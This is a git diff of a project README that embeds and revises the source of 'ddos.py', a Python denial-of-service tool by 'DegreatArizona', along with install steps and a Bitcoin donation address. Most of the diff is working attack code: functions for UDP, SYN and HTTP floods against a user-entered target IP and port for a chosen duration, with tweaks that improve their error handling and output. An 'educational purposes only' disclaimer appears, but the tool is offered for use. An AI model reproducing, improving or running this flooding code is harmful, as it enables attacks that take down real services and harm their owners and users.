@@ -43,6 +43,7 @@ Install the required packages:
 
 ```sh
 pip install -r requirements.txt
+chmod +x ddos.py
 ```
 
 ### Running the Tool
@@ -50,7 +51,7 @@ pip install -r requirements.txt
 Run the script:
 
 ```sh
-python ddos_tool.py
+python ddos.py
 ```
 
 Follow the prompts to input target IP, port, attack duration, and packet data size.
@@ -80,9 +81,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## Author
 
 - [DegreatArizona](https://degreatarizona.com)
-```
 
 ### `LICENSE`
+
 ```markdown
 MIT License
 
@@ -105,10 +106,21 @@ __pycache__/
 termcolor
 ```
 
-### `ddos_tool.py`
+## `Contact`
+- [DegreatArizona](https://degreatarizona.com)
+
+## Buy Me A Coffee
+**Network: Bitcoin**
+```
+143E54wEKY11g3D7G2czfrJebf19t5S9CJ
+```
+
+### `ddos.py`
 (This is your main script file. Copy your debugged script content here.)
 
 ```python
+#!/usr/bin/env python
+
 import sys
 import random
 import os
@@ -116,6 +128,10 @@ import time
 import socket
 from termcolor import colored
 
+# Constants
+MAX_UDP_SIZE = 65507  # Maximum size of UDP payload
+
+# Clear the terminal and print header
 os.system("clear")
 os.system("figlet DegreatArizona DDOS")
 
@@ -130,6 +146,7 @@ print(colored("This tool is written for educational purposes only :)", 'yellow')
 print(colored("Degreatarizona is not responsible for misusing it.", 'yellow'))
 print()
 
+# Input target IP, port, duration, and packet size
 ip = input(colored("Input Target IP Address: ", 'green'))
 try:
     port = int(input(colored("Input Target Port: ", 'green')))
@@ -144,30 +161,47 @@ except ValueError:
     sys.exit()
 
 try:
-    packet_size = int(input(colored("Input Packet Data Size In Bytes: ", 'green')))
-    if packet_size <= 0:
+    packet_size = int(input(colored(f"Input Packet Data Size In Bytes (up to {MAX_UDP_SIZE} bytes): ", 'green')))
+    if packet_size <= 0 or packet_size > MAX_UDP_SIZE:
         raise ValueError
 except ValueError:
     print(colored("Invalid Packet Data Size :( Exiting...", 'blue'))
     sys.exit()
 
+# UDP Flood function
 def udp_flood(ip, port, dur, packet_size):
+    if packet_size > MAX_UDP_SIZE:
+        print(colored(f"Error: Packet size exceeds the maximum allowed size of {MAX_UDP_SIZE} bytes. Adjusting size.", 'red'))
+        packet_size = MAX_UDP_SIZE
+
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     target = (ip, port)
     start_time = time.time()
     packet_count = 0
+
+    print(colored("Starting UDP flood attack...", 'yellow'))
+
     while True:
         try:
             message = random._urandom(packet_size)
             s.sendto(message, target)
             packet_count += 1
-            print(colored(f"Sent Packet {packet_count} Of Size {packet_size} bytes", 'red'))
-        except socket.error:
+            if packet_count % 100 == 0:  # Print status every 100 packets
+                print(colored(f"Sent {packet_count} packets of size {packet_size} bytes", 'red'))
+        except socket.error as e:
+            print(colored(f"Socket error: {e}", 'red'))
             break
+        except Exception as e:
+            print(colored(f"Unexpected error: {e}", 'red'))
+            break
+
         if time.time() - start_time >= dur:
             break
-    s.close()
 
+    s.close()
+    print(colored(f"UDP Flood attack completed. Total packets sent: {packet_count}", 'green'))
+
+# SYN Flood function
 def syn_flood(ip, port, dur):
     sent = 0
     timeout = time.time() + dur
@@ -180,14 +214,15 @@ def syn_flood(ip, port, dur):
             sock.connect((ip, port))
             sent += 1
             print(colored(f"SYN Packets Sent: {sent} To Target: {ip}", 'red'))
-        except (socket.error, OSError):
-            pass
+        except (socket.error, OSError) as e:
+            print(colored(f"Socket error: {e}", 'red'))
         except KeyboardInterrupt:
             print(colored("\n[*] SYN ATTACK STOPPED", 'green'))
             sys.exit()
         finally:
             sock.close()
 
+# HTTP Flood function
 def http_flood(ip, port, dur):
     http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
     sent = 0
@@ -202,8 +237,8 @@ def http_flood(ip, port, dur):
             sock.sendall(http_request)
             sent += 1
             print(colored(f"HTTP Packet Sent: {sent} to Target: {ip}", 'red'))
-        except (socket.error, OSError):
-            pass
+        except (socket.error, OSError) as e:
+            print(colored(f"Socket error: {e}", 'red'))
         except KeyboardInterrupt:
             print(colored("\n[-] ATTACK STOPPED BY USER", 'green'))
             break
